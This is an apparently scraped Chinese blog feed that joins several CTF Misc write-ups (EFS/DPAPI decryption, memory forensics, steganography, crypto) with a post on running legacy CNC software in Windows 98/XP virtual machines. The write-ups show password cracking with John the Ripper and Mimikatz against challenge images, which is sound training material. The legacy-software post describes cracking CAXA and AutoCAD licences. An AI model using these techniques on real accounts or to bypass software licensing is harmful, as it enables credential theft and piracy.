附件给了一个加密的压缩包，直接用弱密码爆破得到密码是123321 解压压缩包可以得到一个 ctfer.png 和一个 secret.py secret.py 内容如下 the password is \"Hav1F6n\",plz use it to solve other wav by py. 根据提示可以知道那个 png 图片中藏了一个 wav 文件 根据 wav 的文件头手动提取即可 把 wav 文件头前的所有数据都删除，然后用 CyberChef 解码并保存即可 然后用stegpy解密即可得到flag，解密密钥就是 secret.txt 中的 Hav1F6n flag{57d69ef29caff0c7ad2fc921ee6c8e06} 题目名称 Device 题目附件给了一个 pcapng 流量包文件，用Wireshark打开发现一堆红条和黑条，因此猜测是加密了","date":"2024-04-01","objectID":"/posts/bd957c3/:0:0","tags":["CTF","Misc","Writeup"],"title":"2024 长城杯信息安全铁人三项赛 Misc Writeup","uri":"/posts/bd957c3/"},{"categories":["Writeup"],"content":"这两天打了 2024 DubheCTF 后突然感觉自己之前学的东西只不过是皮毛中的皮毛 感觉还得是靠打这些难度比较高的比赛来督促自己学习新东西 题目名称 Cipher 从这道题入手，由浅入深学习一下Windows自带的 Cipher 加密（EFS加密算法） 用磁盘精灵打开vhd文件，在public目录下看到一个加密的flag.jpg 直接装载到本地，可以发现还是加密的，根据题目名字 cipher 得知应该是用windows自带的 cipher 加密了 赛后根据参考链接： https://support.microsoft.com/zh-cn/topic/cipher-exe-%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7-%E7%94%A8%E4%BA%8E%E5%8A%A0%E5%AF%86%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F-56c85edd-85cf-ac07-f2f7-ca2d35dab7e4 得知cipher用的是EFS加密 根据参考链接： https://cloud.tencent.com/developer/article/1549305 我们现在很容易可以知道，题目的考点就是要我们找私钥和主密钥了 从详细信息中可以知道该文件的所有者是mark，所以之后的步骤就需要把目光聚焦到用户mark的目录下了 对照着参考链接： https://blog.csdn.net/shuaicenglou3032/article/details/131184510 在 E:\\Users\\mark\\AppData\\Roaming\\Microsoft 路径下成功找到这两个密钥 赛后看了别的师傅的writeup，知道了用户的powershell历史记录会在这个路径下 \\Users\\test\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt 在test用户的目录中找到了各个用户的密码，知道mark用户的密码是superman 如果有 Advanced efs data recovery 这个工具的破解版的话，这道题到这里就结束了 直接用这个工具扫描磁盘获取两个密钥和加密文件，然后输入mark用户的密码 superman 即可解密得到flag 这里贴一张山海关的大佬成功解密的图片 然而因为这个软件我全网都没有找到能用的破解版，官网的试用版只能解密部分内容 因此接下来我要深入分析一下手搓解密EFS的方法 参考链接如下(只能说Lilac的Misc手太强了。。。)： https://lilachit.notion.site/Lilac-2024DubheCTF-wp-caa603fa40ba4699982a13ddf062906a#1b970b22b5e04cb98a5e02cb2f688a4a 首先，假设我们之前不知道test用户的powershell历史记录中有各个用户的密码 因此这里我们就需要先用 DPAPImk2john.py+John the Ripper 去爆破出mark用户的密码 DPAPI是Windows操作系统中的一种加密功能，用于保护用户敏感数据，例如用户的登录密码、浏览器保存的密码等。DPAPImk2john.py脚本可以提取这些被DPAPI加密的凭据，并将其转换为John the Ripper密码破解工具所支持的格式，以便进行密码破解或分析操作。 先用DPAPImk2john.py脚本获取DPAPI的Hash值 然后将hash.txt拉到 kali 或者直接在 Windows 中用 john 根据 rockyou.txt 字典进行爆破 爆破完即可得到密码是 superman 得到 mark 的密码后，就可以使用 Mimikatz 爆破 Masterkeys 了 masterkey with password: superman (normal user) key : 168f6183d9d7d4aeb3b21aed8d683d1593997723050ec47619c6b9650fd54e49ef0c31707f22e1b189bb65a0b5a96061fa95f0415b3fa8429598f94a52a80756 sha1: f354189efecfb4629ae66ae862ad4fa0ae1fdaa3 本人目前水平有限，这里就先贴一份Lilac大佬写的脚本吧，脚本解密完即可得到flag from cryptography.hazmat.primitives import serialization from cryptography.hazmat.primitives.asymmetric import padding from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes with open('private.pem', 'rb') as key_file: private_key = serialization.load_pem_private_key(key_file.read(), password=None) with open('$EFS', 'rb') as EFS_file: efs = EFS_file.read() ''' typedef struct { DWORD AttributeLength; DWORD State; DWORD Version; DWORD CryptoAPIVersion; BYTE Checksum[16]; BYTE ChecksumDDF[16]; BYTE ChecksumDRF[16]; DWORD OffsetToDDF; DWORD OffsetToDRF; } MFT_RECORD_ATTRIBUTE_EFS_HEADER, * PMFT_RECORD_ATTRIBUTE_EFS_HEADER; ''' OffsetToDDF = int.from_bytes(efs[0x40:0x44], byteorder='little') print(f'OffsetToDDF: {hex(OffsetToDDF)}') ''' typedef struct { DWORD Count; } MFT_RECORD_ATTRIBUTE_EFS_ARRAY_HEADER, * PMFT_RECORD_ATTRIBUTE_EFS_ARRAY_HEADER; ''' Count = int.from_bytes(efs[OffsetToDDF:OffsetToDDF+4], byteorder='little') print(f'Count: {Count}') assert Count == 1, 'Count != 1 unsupported for now' ''' typedef struct { DWORD Length; DWORD CredentialHeaderOffset; DWORD FEKSize; DWORD FEKOffset; } MFT_RECORD_ATTRIBUTE_EFS_DATA_DECRYPTION_ENTRY_HEADER, * PMFT_RECORD_ATTRIBUTE_EFS_DATA_DECRYPTION_ENTRY_HEADER; ''' entry_header = efs[OffsetToDDF+4:OffsetToDDF+4+16] Length = int.from_bytes(entry_header[0:4], byteorder='little') print(f'Length: {hex(Length)}') CredentialHeaderOffset = int.from_bytes(entry_header[4:8], byteorder='little') print(f'CredentialHeaderOffset: {hex(CredentialHeaderOffset)}') FEKSize = int.from_bytes(entry_header[8:12], byteorder='little') print(f'FEKSize: {FEKSize}') FEKOffset = int.from_bytes(entry_header[12:16], byteorder='little') + OffsetToDDF + 4 print(f'FEKOffset: {hex(FEKOffset)}') encrypted_fek = efs[FEKOffset:FEKOffset+FEKSize][::-1] decrypted_fek = private_key.decrypt(encrypted_fek, padding=padding.PKCS1v15()) ''' typedef struct { DWORD KeyLength; DWORD Entropy; ALG_ID Algorithm; DWORD Reserved; BYTE Key[1]; } EFS_FEK, * PEFS_FEK; ''' KeyLength = int.from_bytes(decrypted_fek[0:4], byteorder='little'","date":"2024-03-19","objectID":"/posts/10f4f96/:0:0","tags":["CTF","Misc","Writeup"],"title":"2024 XCTF国际网络攻防联赛-DubheCTF分站赛 Misc Writeup","uri":"/posts/10f4f96/"},{"categories":["Writeup"],"content":"发现自己有段时间没有打比赛了，手有点生疏，于是打了 2024VCTF 来找找感觉 题目名称 checkin 不愧是ChaMd5（查MD5获得flag） flag{We1c0m3_VCTF_2024} 题目名称 f0rensicmaster 下载得到一个 e01磁盘镜像文件，bitlocker加密了，尝试找密钥 用FTK打开part0，可以看到有一个hint.zip，里面有logo.png和key.txt 这里需要直接把root整个文件夹都导出，要不然图片会无法正常显示 压缩包也有一个logo.png猜测是需要明文攻击了 成功获得加密密钥，解压压缩包即可得到bitlocker的恢复密钥 428560-250679-278762-263923-677336-652740-614834-399795 用 Passware kit 填上得到的密钥恢复即可得到一个后缀为 DD 的文件 用FTK打开后缀为 DD 的磁盘镜像文件 成功加载，然后发现用户ccpc桌面上有一个钓鱼木马的文件夹，尝试直接导出发现里面没东西 尝试用FTK直接挂载到本地 发现根目录下有一个flag.txt 打开，用CyberChef识别发现是摩斯电码，找在线网站解密可以得到一个奶牛快传的链接 访问链接，发现奶牛快传里也是一个flag.txt，打开发现是乱码的 用VeraCrypt解密并挂载flag.txt，密钥是平台给的Hint：RtTNZ\u0026n$GKaKuehKO3+* 挂载好后得到一个无间道.docx，改后缀为zip打开，得到四张图片 image2和opposite末尾有逆置的压缩包数据，尝试还原并提取出来 不会真有人去查校庆日吧，懒惰的人都是直接开爆的 解压最后一个压缩包即可得到flag：flag{ba93d8e998e5522c7d800f94125907dc} 题目名称 ezmisc｜ TODO 很早之前看到过这种，但是没有自己亲自动手实现过 参考链接：https://github.com/ggerganov/kbd-audio 题目名称 狂飙 题目附件如下 import os from flag import flag from Crypto.Util.number import * from Crypto.Cipher import AES m = 88007513702424243702066490849596817304827839547007641526433597788800212065249 key = os.urandom(24) key = bytes_to_long(key) n = m % key flag += (16 - len(flag) % 16) * b'\\x00' iv = os.urandom(16) aes = AES.new(key, AES.MODE_CBC, iv) enc_flag = aes.encrypt(flag) print(n) print(enc_flag) print(iv) # 103560843006078708944833658339172896192389513625588 # b'\\xfc\\x87\\xcb\\x8e\\x9d\\x1a\\x17\\x86\\xd9~\\x16)\\xbfU\\x98D\\xfe\\x8f\\xde\\x9c\\xb0\\xd1\\x9e\\xe7\\xa7\\xefiY\\x95C\\x14\\x13C@j1\\x9d\\x08\\xd9\\xe7W\u003eF2\\x96cm\\xeb' # b'UN\\x1d\\xe2r\u003c\\x1db\\x00\\xdb\\x9a\\x84\\x1e\\x82\\xf0\\x86' 因为key是随机生成的24字节 byte 类型的字符串，n倍的key 等于 m-n，因此我们可以分解 m-n ，然后根据因数和 key 的长度来爆破 key from Crypto.Util.number import * from Crypto.Cipher import AES import itertools from math import * m = 88007513702424243702066490849596817304827839547007641526433597788800212065249 n = 103560843006078708944833658339172896192389513625588 # print(m-n) c = b'\\xfc\\x87\\xcb\\x8e\\x9d\\x1a\\x17\\x86\\xd9~\\x16)\\xbfU\\x98D\\xfe\\x8f\\xde\\x9c\\xb0\\xd1\\x9e\\xe7\\xa7\\xefiY\\x95C\\x14\\x13C@j1\\x9d\\x08\\xd9\\xe7W\u003eF2\\x96cm\\xeb' iv = b'UN\\x1d\\xe2r\u003c\\x1db\\x00\\xdb\\x9a\\x84\\x1e\\x82\\xf0\\x86' fac = [3, 37, 439, 3939851, 265898280367, 5036645362649, 342291058100503482469327892079792475478873] for f in itertools.product(fac, repeat=4): # 从列表中抽4个元素的所有情况 # print(f) key = prod(f) # 计算可迭代对象中所有元素的乘积 if 188 \u003c= key.bit_length() \u003c= 192: # [23.5*8,24*8] aes = AES.new(long_to_bytes(key), AES.MODE_CBC, iv) flag = aes.decrypt(c) if b'flag' in flag: print(flag) # flag{cf735a4d-f9d9-5110-8a73-5017fc39b1b0} ","date":"2024-03-17","objectID":"/posts/aa61ddd/:0:0","tags":["CTF","Writeup","Misc"],"title":"2024 VCTF Misc Writeup","uri":"/posts/aa61ddd/"},{"categories":["Skills"],"content":"最近放假回家了，闲来无事，就折腾了一下家里的老电脑，顺便优化更新一下店里的老东西 前言 目前线切割加工行业用的电脑系统大部分是WIndowsXP和Windows98，因为当代行业从业者用的比较顺手和习惯的的软件(AutoP、CAXA、HF等)都只能在比较老的机型以及系统上运行，听说原因是因为软件的开发者去世了，然后软件就一直没有迭代更新。然而电脑硬件和系统是一直在更新的，这就导致了当年的那些软件无法适配当前硬件和系统的情况，感觉当初的软件开发者也没有想到软件兼容性的问题吧，几十年前用着DOS系统的开发者，又怎么可能会想到现如今电脑硬件和系统发展速度会如此之快呢。 很早之前就听说了上面这个问题，然后很多行业从业者为了能继续使用那些软件，就不得不费劲周折甚至花大价钱去寻找老电脑，通过这几天对软件和系统的探索，我大概可以猜测，应该是只有搭载奔腾系列CPU的电脑可以继续运行那些软件，这还是仅针对于WindowsXP系统下的那些软件，因为CPU运行速度太快，那些软件就会直接闪退而无法运行。如果是WIndows98系统，那就更别说了，靠自己几乎是找不到能适配这个系统的硬件的，因此大多数从业者只能选择向某些企业购买昂贵的工控机（个人感觉就是老东西翻新一下的垃圾）。 之后在某一天和父亲聊到这些事情的时候，突发奇想，能不能用VMware虚拟机限制机器的性能从而达到上面的要求呢？经过简单的尝试，发现是存在这种可能的，于是我就断断续续的开始了漫长的折腾。 折腾记录 因为主要用到的就是下面这两个系统，因此这里我就分开来记录了 WIndowsXP-SP3 首先这里为什么要指定SP3这个版本号呢？因为经过我的尝试，发现在别的某些系统版本上，汇智线切割软件是无法正常使用的，会有各种各样的问题，之后我在查看汇智的官网的时候，发现他们说在SP3这个版本上是可以正常使用的，经过我的尝试也确实如此。 XP系统上需要的软件也就是下面这几个： 1、汇智线切割软件 这个软件的安装很方便，直接安装包安装好就行，但是要注意虚拟机不能开启那个虚拟化CPU性能计数器(U) 使用方法也是非常的简单，USB插上官方的硬件后，开启机床，连按三次电源键进入配对状态 然后软件中选择好要配对的设备，选好设备的品牌，直接配对即可，没有什么复杂的认证过程，猜测就是纯纯某一频段的信号的配对 2、CAXA 安装完成后，把破解的启动方式复制到安装目录中，再把时间往后调几个月 然后再打开软件，出现 授权给 的字样就是破解成功了，再把时间调回来即可。 3、AutoP 一个编辑2D图形的软件 目前WindowsXP存在的问题 AutoP静置或者挂后台一段时间后显示颜色就会发生变化，可能会变成乱七八的颜色【待解决】 WIndows98 Windows98也是一样，首先要确定合适的版本或者说镜像，经过我的尝试，发现 Win98 se 和 Win98 me 已经不兼容 intel 10代之后的CPU了，因为最新的CPU已经没有了之前的某些指令。然后后来在网上搜到有大佬推荐新泰的Win98的镜像，经过尝试发现确实是可以用的，而且还贼好用，装系统就是一键安装的，免去了很多乱七八糟的复杂操作，恨我没有早点发现这个镜像。 安装虚拟机系统的时候可以把硬盘搞小一点，4个G感觉就足够了 装好虚拟机系统后我感觉首先要设置的就是共享文件夹，因为直接用VMtools的话感觉会有某些问题 Win98设置共享文件夹需要在控制面板-网络中添加该功能（默认是不开启的） 设置完共享文件夹后，还要在虚拟机设置里把网络模式改成桥接 然后把磁盘魔术师分区工具pq8.0通过共享文件夹上传到虚拟机中 之后关机，给虚拟机硬盘多扩展3个G（因为要多分出来3个盘D、E、F） 之后再开机用这个工具进行分区即可，主分区-1G-FAT32，设置完后保存并重启即可 接下来就是Win98上线切割常用软件的安装了 线切割超级软件 这个其实就是一个整合快捷方式的小工具 配置文件是软件目录下的config文件 直接修改配置文件中的软件地址即可 ZDBC 这个工具有两种，一种是列出文件的，一种是不列出文件，要直接输文件名的，但是无论哪种，在XP下是无法正常运行的，图形是无法正常显示的。 1、不列出文件的ZDBC 2、列出文件的ZDBC HF软件 这个是控制机床的软件，使用前需要插入一张PCI控制卡和加密狗【瞎搞可能会有烧坏的风险，但是加密狗有盗版的】 现在的问题就是机床的厂商是推荐从业者用工控机来控制机床，价格贵而且性能不稳定【毕竟就是老东西翻新然后组装一下】 希望能知道那个PCI控制卡是要用什么接口，然后尝试看看能不能用新电脑装虚拟机来解决这个问题 AutoP 这个就比较通用了和XP下面的是一样的，一个用来编辑图形的软件 这个软件中的默认目录好像是需要我们输入，然后修改的，改过一次就一直都是默认了 CAXA 这个也是一个编辑图形的软件，然后XP下面新版的和旧版的是无法兼容的，因为某些驱动的问题 这个软件安装之前好像需要我们先安装VMtools，要不然会出现某些dll文件缺失的报错 使用这个软件之前是需要我们自己破解一下的，就是安装完成后，把破解的启动方式复制到安装目录中，再把时间往后调几个月 然后再打开软件，出现 授权给 的字样就是破解成功了，再把时间调回来即可。 AutoCAD2004 CAD就不需要多说了，非常主流的画图软件 但是安装这个之前，需要先安装新版IE浏览器，要不然会无法安装 同样，安装完成后是需要我们进行破解的，打开破解文件夹，导入注册表，然后将那个配置文件拉到安装目录下即可 目前Windows98存在的问题 Intel十代以后的CPU好像因为删除了某些指令集，导致无法正常安装Win98虚拟机【待尝试】 解决方法：需要打补丁，b站上面好像有个大佬发了教程 参考链接： https://www.sysnettechsolutions.com/en/install-windows-98-vmware/ https://zhuanlan.zhihu.com/p/651842022 ","date":"2024-02-07","objectID":"/posts/4b500cc/:0:0","tags":["Skills"],"title":"线切割-Windows98\u0026WindowsXP折腾记录","uri":"/posts/4b500cc/"},{"categories":["Writeup"],"content":"本周六和队友一起打了一下安洵杯，这里对比赛中的Misc题做一个简单的复盘 题目名称 Nahida! 题目附件给了一个 Nahida! 文件，010打开，一眼JPG逆序 逆序后得到一张草神的图片，图片末尾用UTF-8编码查看可以得到一串提示 提示给的很明显了，必须是silenteye了 用silenteye解密图片，密钥是Nahida，解密即可得到flag：d0g3{Nahida_is_the_best_in_the_world!} 题目名称 misc-dacongのWindows 附件给了一个windows10的内存转储raw文件 经过判断 profile=Win10x64 ，用户名是 miku 然后从filescan中得知桌面上有这几个可疑的文件，但是用vol2无法直接dumpfiles 后来换成vol3，成功dumpfiles file.rar 里面有个file.txt 尝试提取但是内容是空的 secret.rar 里面有个flag2.txt，SNOW解密即可得到flag2 flag3.txt 里面是一段加密的密文 桌面上dacong_like_listen 文件夹中有dacong1-50.wav，一眼SSTV，flag1在39.wav中 提取文件需要用到的偏移量如下所示 0xe0007922c890 \\Users\\miku\\Music\\do_you_want_listen.txt 216 0xe0007a09d470 \\Users\\miku\\Desktop\\flag3.txt 216 0x0000e00079b15f20 2 0 RWD--- \\Device\\HarddiskVolume3\\Users\\miku\\Documents\\secret.rar 0x0000e00078a086a0 16 0 RWD--- \\Device\\HarddiskVolume3\\Users\\miku\\Music\\dacong_like_listen\\dacong13.wav 0x0000e00078a3c4a0 16 0 RWD--- \\Device\\HarddiskVolume3\\Users\\miku\\Music\\dacong_like_listen\\dacong3.wav 0x0000e00078e21090 16 0 RWD--- \\Device\\HarddiskVolume3\\Users\\miku\\Music\\dacong_like_listen\\dacong24.wav 0x0000e00079200090 16 0 RWD--- \\Device\\HarddiskVolume3\\Users\\miku\\Music\\dacong_like_listen\\dacong17.wav 0x0000e00079262f20 16 0 RWD--- \\Device\\HarddiskVolume3\\Users\\miku\\Music\\dacong_like_listen\\dacong15.wav 0x0000e00079266090 16 0 RWD--- \\Device\\HarddiskVolume3\\Users\\miku\\Music\\dacong_like_listen\\dacong36.wav 0x0000e000794a79b0 16 0 RWD--- \\Device\\HarddiskVolume3\\Users\\miku\\Music\\dacong_like_listen\\dacong38.wav 0x0000e000794d9170 16 0 RWD--- \\Device\\HarddiskVolume3\\Users\\miku\\Music\\dacong_like_listen\\dacong27.wav 0x0000e00079590090 16 0 RWD--- \\Device\\HarddiskVolume3\\Users\\miku\\Music\\dacong_like_listen\\dacong23.wav 0x0000e000796a5090 16 0 RWD--- \\Device\\HarddiskVolume3\\Users\\miku\\Music\\dacong_like_listen\\dacong28.wav 0x0000e00079a8ddb0 16 0 RWD--- \\Device\\HarddiskVolume3\\Users\\miku\\Music\\dacong_like_listen\\dacong33.wav 0x0000e00079ada090 16 0 RWD--- \\Device\\HarddiskVolume3\\Users\\miku\\Music\\dacong_like_listen\\dacong42.wav 0x0000e00079b03200 16 0 RWD--- \\Device\\HarddiskVolume3\\Users\\miku\\Music\\dacong_like_listen\\dacong10.wav 0x0000e00079c58090 16 0 RWD--- \\Device\\HarddiskVolume3\\Users\\miku\\Music\\dacong_like_listen\\dacong12.wav 0x0000e00079c65770 16 0 RWD--- \\Device\\HarddiskVolume3\\Users\\miku\\Music\\dacong_like_listen\\dacong7.wav 0x0000e00079d7ff20 16 0 RWD--- \\Device\\HarddiskVolume3\\Users\\miku\\Music\\dacong_like_listen\\dacong9.wav 0x0000e00079e84090 16 0 RWD--- \\Device\\HarddiskVolume3\\Users\\miku\\Music\\dacong_like_listen\\dacong26.wav 0x0000e00079f64660 16 0 RWD--- \\Device\\HarddiskVolume3\\Users\\miku\\Music\\dacong_like_listen\\dacong50.wav 0x0000e0007a0a9480 16 0 RWD--- \\Device\\HarddiskVolume3\\Users\\miku\\Music\\dacong_like_listen\\dacong43.wav 0x0000e0007a175420 16 0 RWD--- \\Device\\HarddiskVolume3\\Users\\miku\\Music\\dacong_like_listen\\dacong39.wav 0x0000e0007a1ffc40 16 0 RWD--- \\Device\\HarddiskVolume3\\Users\\miku\\Music\\dacong_like_listen\\dacong16.wav 0x0000e0007a203530 16 0 RWD--- \\Device\\HarddiskVolume3\\Users\\miku\\Music\\dacong_like_listen\\dacong49.wav 0x0000e0007a25c310 16 0 RWD--- \\Device\\HarddiskVolume3\\Users\\miku\\Music\\dacong_like_listen\\dacong46.wav 0x0000e0007a2da640 16 0 RWD--- \\Device\\HarddiskVolume3\\Users\\miku\\Music\\dacong_like_listen\\dacong20.wav 0x0000e0007a302930 16 0 RWD--- \\Device\\HarddiskVolume3\\Users\\miku\\Music\\dacong_like_listen\\dacong47.wav 0x0000e0007a33f090 16 0 RWD--- \\Device\\HarddiskVolume3\\Users\\miku\\Music\\dacong_like_listen\\dacong34.wav 0x0000e0007a343410 16 0 RWD--- \\Device\\HarddiskVolume3\\Users\\miku\\Music\\dacong_like_listen\\dacong5.wav 0x0000e0007a34a090 16 0 RWD--- \\Device\\HarddiskVolume3\\Users\\miku\\Music\\dacong_like_listen\\dacong37.wav 0x0000e0007a422c50 16 0 RWD--- \\Device\\HarddiskVolume3\\Users\\miku\\Music\\dacong_like_listen\\dacong6.wav 0x0000e0007a432770 16 0 RWD--- \\Device\\HarddiskVolume3\\Users\\miku\\Music\\dacong_like_listen\\dacong41.wav 0x0000e0007a4d5e80 16 0 RWD--- \\Device\\HarddiskVolume3\\Users\\miku\\Music\\dacong_like_listen\\dacong29.wav 0x0000e0007a615dc0 16 0 RWD--- \\Device\\","date":"2023-12-24","objectID":"/posts/66357b4/:0:0","tags":["CTF","Writeup","Misc"],"title":"2023 安洵杯网络安全挑战赛 Misc Writeup","uri":"/posts/66357b4/"},{"categories":["Writeup"],"content":"只能说有点可惜吧，本来Misc还能再多出几道题的，无奈比赛时脑子秀逗了 题目名称 碟影重重2.0 下载附件得到一个只有TCP流量的流量包 题目需要我们分析流量包找到飞机的飞机速度和飞机的 ICAO CODE 问了GPT得知飞机常见的协议中有ADS-B，然后在网上找到pyModeS这个模块 在 参考链接 看到了与tcp.payload中相似的数据 使用 tshark 提取出流量包中的数据，然后使用这个脚本批量解密找speed最快的即可 tshark -r attach.pcapng -T fields -e “tcp.payload” | sed ‘/^\\s*$/d’ \u003e tshark.txt import pyModeS with open(\"tshark.txt\") as f: data = f.readlines() for item in data: # print(item.strip()) if len(item.strip()) != 46: continue res = pyModeS.tell(item.strip()[18:46]) print(\"===========================================================================\") Tips：这里的 ICAO CODE 需要大写：79A05E 然后MD5加密一下即可得到：flag{4cf6729b9bc05686a79c1620b0b1967b} 题目名称 Wabby Wabbo Radio 题目给的容器是一个网页版的播放器，通过抓包，得到了以下几个wav文件 xh1.wav、xh2.wav、xh3.wav、xh4.wav、xh5.wav、hint1.wav、hin2.wav、flag.wav 除了flag.wav以外，别的几个wav的左声道都是有摩斯电码的 第一段： - .... . .-- . .- - .... . .-. .. ... .-. . .- .-.. .-.. -.-- -. .. -.-. . - --- -.. .- -.-- .-.-.- .. - .----. ... .- --. .-. . .- - -.. .- -.-- - --- .-.. .. ... - . -. - --- - .... . .-- .- -... -... -.-- .-- .- -... -... --- .-. .- -.. .. --- THE WEATHER IS REALLY NICE TODAY. IT’S A GREAT DAY TO LISTEN TO THE WABBY WABBO RADIO 第二段 --. . -. ... .... .. -. .. -- .--. .- -.-. - ... - .- .-. - ... GENSHIN IMPACT STARTS 第三段 -.. --- -.-- --- ..- .-- .- -. - .- ..-. .-.. .- --. ..--.. .-.. . - .----. ... .-.. .. ... - . -. .- .-.. .. - - .-.. . .-.. --- -. --. . .-. DO YOU WANT A FLAG ?LET’S LISTEN A LITTLE LONGER 第四段 -.. --- -.-- --- ..- .-- .- -. - .- .... .. -. - ..--.. .-.. . - .----. ... .-.. .. ... - . -. .- .-.. .. - - .-.. . .-.. --- -. --. . .-. DO YOU WANT A HINT?LET’S LISTEN A LITTLE LONGER 第五段 .. ..-. -.-- --- ..- -.. --- -. .----. - -.- -. --- .-- .... --- .-- - --- -.. --- .. - --..-- -.-- --- ..- -.-. .- -. --. --- .- .... . .- -.. .- -. -.. -.. --- ... --- -- . - .... .. -. --. . .-.. ... . ..-. .. .-. ... - IF YOU DON’T KNOW HOW TO DO IT,YOU CAN GO AHEAD AND DO SOME THING ELSE FIRST Hint1 -.. --- -.-- --- ..- -.- -. --- .-- --.- .- -- ..--.. DO YOU KNOW QAM(正交振幅调制)? Hint2 -- .- -.-- -... . ..-. .-.. .- --. .. ... .--. -. --. .--. .. -.-. - ..- .-. . MAYBE FLAG IS PNG PICTURE flag.wav 读取wav的数据用plot画个图，发现数据的分布其实是十分规则的，明显就是16QAM 根据PNG的文件头89504E47找到16QAM的对应关系，然后写脚本读取数据转换就行 import scipy.io.wavfile as wav from Crypto.Util.number import * def read_wav_file(file_path): sample_rate, data = wav.read(file_path) return sample_rate, data dic = { 1: '10', -1: '01', 3: '11', -3: '00' } if __name__ == \"__main__\": res = '' wav_file_path = \"flag.wav\" sample_rate, data = read_wav_file(wav_file_path) for item in data: x = round(item[0]) y = round(item[1]) res += dic[x]+dic[y] # print(res) data = long_to_bytes(int(res, 2)) with open('flag.png', 'wb') as f: f.write(data) 题目名称 找到PNG了吗 Linux内存取证，内核版本如下： Linux version 5.4.0-100-generic (buildd@lcy02-amd64-002) (gcc version 9.3.0 (Ubuntu 9.3.0-17ubuntu1~20.04)) #113-Ubuntu SMP Thu Feb 3 18:43:29 UTC 2022 (Ubuntu 5.4.0-100.113-generic 5.4.166) 根据我博客里 LInux内存取证 的那篇文章制作vol2的Profile即可 查看桌面，发现有 have_your_fun.jocker 这个文件 然后在010中搜索这个文件名，得到一串RC4加密的代码 用那两个KEY去加密PNG头，然后用010去找 定位到文件，往下随便复制一大段十六进制值，CyberChef一把梭即可得到flag ","date":"2023-12-19","objectID":"/posts/5f3fb7a/:0:0","tags":["CTF","Writeup"],"title":"2023 强网杯全国网络安全挑战赛 Misc Writeup","uri":"/posts/5f3fb7a/"},{"categories":["Writeup"],"content":"2023 楚慧杯网络空间安全实践能力竞赛 Misc Writeup 本文中涉及的具体题目附件可以进我的知识星球获取 题目名称 ez_zip 解压附件得到一个4096.zip，打开发现有一个4095.zip，因此猜测是压缩包套娃 直接写个Python脚本解套即可 import zipfile import os def decompress_zip(archive_file): with zipfile.ZipFile(archive_file, 'r') as zip_ref: zip_ref.extractall(path=\"tmp/\") os.remove(archive_file) os.system(\"mv tmp/* .\") os.rmdir(\"tmp\") if __name__ == \"__main__\": for i in range(4096,0,-1): filename = f\"{i}.zip\" decompress_zip(filename) print(f\"[+] {filename} 解压成功 =======\u003e\") 全部解压完后可以得到一个1.txt，内容如下 +-+++-++ +-+++++- +-+-– +-++++– +-+-+- +-+++–+ +—-+– ++–+++- ++–++++ +–+++– ++–+-+- ++—+++ –-+ ++–+-+- —+++ +–+++– +–+++– +––+ –+++- +–-+- –+— +–+++– –+–+ –– –+++- +–-+- –+-+- —- –+++- –+++- +–-+- +–- –+–+ +–++++- +–+++– +–+++– –+- +–-+- +–- +—–+- 直接CyberChef转二进制，然后转字符串即可得到flag：DASCTF{10c58258ccf1e7c631e5911ed6acc4ed} 题目名称 easy取证 下载附件并解压，得到一个mem.raw内存镜像，直接使用vol2进行内存取证 在桌面上可以找到一个机密.docx，尝试导出 导出后打开，发现是一个只有空白字符的文档，猜测是SNOW隐写 把所有空白字符复制到TXT文件中，尝试直接使用无密码的SNOW解密，但是发现得不到有效信息 用mimikatz插件可以提取出用户名和密码 使用得到的密码H7Qmw_X+WB6BXDXa解密SNOW隐写即可得到flag：DASCTF{f891eff370a2cbefec49d2a577b552d3} 题目名称 gb2312-80 下载附件并解压，可以得到如下内容 cipher.txt中的内容如下，每行十六个元素 0,0,4080,3072,3072,3072,4032,3680,48,48,48,3120,1632,960,0,0 0,0,992,1584,3096,3096,3096,3096,3096,3096,3096,3096,1584,992,0,0 0,64,192,448,960,704,1728,3264,3264,6336,8176,192,192,480,0,0 0,0,3584,1536,1536,1536,2016,1560,1560,1560,1560,1560,3056,0,0,0 0,0,992,1584,3096,3096,3096,3096,3096,3096,3096,3096,1584,992,0,0 0,0,960,1632,3120,48,96,448,96,48,48,3120,1632,960,0,0 0,0,992,1584,3096,3096,3096,3096,3096,3096,3096,3096,1584,992,0,0 0,64,192,448,960,704,1728,3264,3264,6336,8176,192,192,480,0,0 0,0,128,896,384,384,384,384,384,384,384,384,384,960,0,0 0,64,192,448,960,704,1728,3264,3264,6336,8176,192,192,480,0,0 0,0,992,1584,3096,3096,3096,3096,3096,3096,3096,3096,1584,992,0,0 0,0,992,1584,3096,3096,3096,3096,3096,3096,3096,3096,1584,992,0,0 0,0,992,1584,3096,3096,3096,3096,3096,3096,3096,3096,1584,992,0,0 0,0,960,1632,3120,3120,3120,3120,1648,1008,48,3120,1632,960,0,0 0,0,992,1584,3096,3096,3096,3096,3096,3096,3096,3096,1584,992,0,0 0,0,992,1584,3096,3096,3096,3096,3096,3096,3096,3096,1584,992,0,0 0,0,992,1584,3096,3096,3096,3096,3096,3096,3096,3096,1584,992,0,0 0,0,960,1632,3120,3120,1632,960,1632,3120,3120,3120,1632,960,0,0 0,0,992,1584,3096,3096,3096,3096,3096,3096,3096,3096,1584,992,0,0 0,0,992,1584,3096,3096,3096,3096,3096,3096,3096,3096,1584,992,0,0 然后去网上搜索font_rect，可以找到这个项目，发现是画点阵图的项目，并且图片大小是16x16的 正好与附件所给的数据格式相符，因此我们尝试写一个脚本画一下点阵图 def draw2pic1(): with open(\"cipher.txt\",\"r\") as f: data = f.read() row_list = data.split() for row in row_list: pixel_data = [] img = Image.new(mode=\"RGB\",size=(16,16)) data = row.split(',') for item in data: bin_line = bin(int(item))[2:].rjust(16,'0') # print(bin_line) for bin_data in bin_line: if bin_data != '0': pixel_data.append((255,255,255)) else: pixel_data.append((0,0,0)) img.putdata(pixel_data) img = img.resize((250,250)) # 调整一下图片大小，便于查看 img.save(f\"./out/{row}.png\") 画完后发现一共就16种图像，因此猜测是十六进制的数据 我们根据上面的图片找出对应的表，然后提取出十六进制的数据，查看头几个数据就可以发现是个压缩包 因此我们编写以下脚本把压缩包提取出来 def extract_data(): table = { '0,0,992,1584,3096,3096,3096,3096,3096,3096,3096,3096,1584,992,0,0': '0', '0,0,128,896,384,384,384,384,384,384,384,384,384,960,0,0': '1', '0,0,960,1632,3120,3120,48,48,96,192,384,784,1552,4080,0,0': '2', 